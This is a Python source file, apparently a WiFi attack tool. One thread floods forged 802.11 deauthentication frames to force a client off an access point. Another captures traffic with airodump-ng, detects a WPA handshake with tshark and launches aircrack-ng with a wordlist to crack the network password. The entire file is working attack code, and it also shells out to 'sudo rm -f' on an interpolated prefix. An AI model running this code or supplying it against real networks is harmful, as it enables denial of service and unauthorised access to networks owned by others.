import subprocess
import os
import time
import threading
from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp, conf

conf.verb = 0

def deauth_worker(target_bssid, target_client, network_interface, count, interval, stop_signal):
    dot11 = Dot11(type=0, subtype=12, addr1=target_client, addr2=target_bssid, addr3=target_bssid)
    deauth_frame = RadioTap() / dot11 / Dot11Deauth(reason=7)

    while not stop_signal.is_set():
        try:
            sendp(deauth_frame, iface=network_interface, count=count, inter=0.005, verbose=False)
            stop_signal.wait(interval)
        except Exception:
            stop_signal.set()
            break

def capture_worker(bssid, channel, iface, timeout, capture_prefix, cap_file, wordlist, stop_signal):
    airodump_cmd = ['sudo', 'airodump-ng', '--bssid', bssid, '--channel', channel, '-w', capture_prefix, iface]

    while not stop_signal.is_set():
        subprocess.run(f"sudo rm -f {capture_prefix}*", shell=True)
        proc = subprocess.Popen(airodump_cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        start = time.time()
        while time.time() - start < timeout:
            if stop_signal.wait(0.2):
                break
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except:
            proc.kill()

        if not os.path.exists(cap_file):
            continue

        try:
            result = subprocess.run(["tshark", "-r", cap_file, "-Y", "eapol"],
                                    capture_output=True, text=True, check=True, timeout=20)
            if "EAPOL" in result.stdout:
                stop_signal.set()
                if os.path.exists(wordlist):
                    crack_cmd = ['sudo', 'aircrack-ng', '-w', wordlist, '-b', bssid, cap_file]
                    subprocess.run(crack_cmd)
        except:
            continue